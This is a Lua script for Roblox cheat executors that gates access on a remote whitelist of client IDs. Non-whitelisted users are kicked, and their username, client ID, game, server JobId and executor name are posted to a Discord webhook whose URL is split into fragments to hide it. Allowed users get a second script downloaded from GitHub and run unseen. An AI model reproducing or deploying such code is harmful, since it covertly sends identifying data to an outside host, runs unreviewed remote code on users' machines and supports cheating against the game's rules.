repeat wait() until game:IsLoaded()
local check = nil
local sttsc = false
activewebhook = true
local bobby = "ht".."tps".."://dis"..
"cor".."d.com".."/ap".."i/we"..
"bho".."oks/104".."39900".."37206"..
"929438/cv7".."DCc".."G6y".."0Us"..
"Y1VR".."q7vi".."QB-yP7k_Sk9"..
"3ajUL".."ndbW".."7sIOu".."Mze7O"..
"qe38LU".."tjlBkP".."SDxoeU"
local TIME_ZONE = 1
local date = os.date("!*t")
local hour = (date.hour + TIME_ZONE) % 24
local ampm = hour < 12 and "AM" or "PM"
local timestamp = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, ampm)
local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
dothethingy = http_request or request or HttpPost or syn.request
for i,v in pairs(loadstring(game:HttpGet('https://raw.githubusercontent.com/948265/ax/main/id1'))()) do
    if v == game:GetService("RbxAnalyticsService"):GetClientId() then
        sttsc = true
    end
end
if sttsc == false then
game.Players.LocalPlayer:Kick('You are not whitelisted!')
dothethingy({Url = bobby, Body = game:GetService("HttpService"):JSONEncode({
["embeds"] = {{["title"] = "*Unsuccessfully Executed*",
["description"] = '```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", LocalPlayer)```',
["fields"] = {
    {
      ["name"] = "*Username*",
      ["value"] = "*" .. game.Players.LocalPlayer.Name .. "*",
      ["inline"] = true
    },
    {
      ["name"] = "*ID*",
      ["value"] = "*" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "*" ,
      ["inline"] = true
    },
    {
      ["name"] = "*Game*",
      ["value"] = "*" ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "*",
      ["inline"] = true
    },
    {
        ["name"] = "*Executor*",
        ["value"] = "*" .. loleh .. "*",
        ["inline"] = true
    },
    {
        ["name"] = "*JobId*",
        ["value"] = "*" ..game.JobId .. "*",
        ["inline"] = true
    },
    {
        ["name"] = "*PlaceId*",
        ["value"] = "*" .. game.PlaceId .. "*",
        ["inline"] = true
    }},
    ["footer"] = {
        ["text"] = os.date(),
        ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. game.Players.LocalPlayer.UserId .. "&width=150&height=150&format=png"
      },
["type"] = "rich",["color"] = 14680064}}}), Method = "POST", Headers = {
["content-type"] = "application/json"}})
end
repeat wait() until sttsc
loadstring(game:HttpGet('https://raw.githubusercontent.com/HelloHiPro/HelloHiPro/main/New_Text_Document.lua'))()
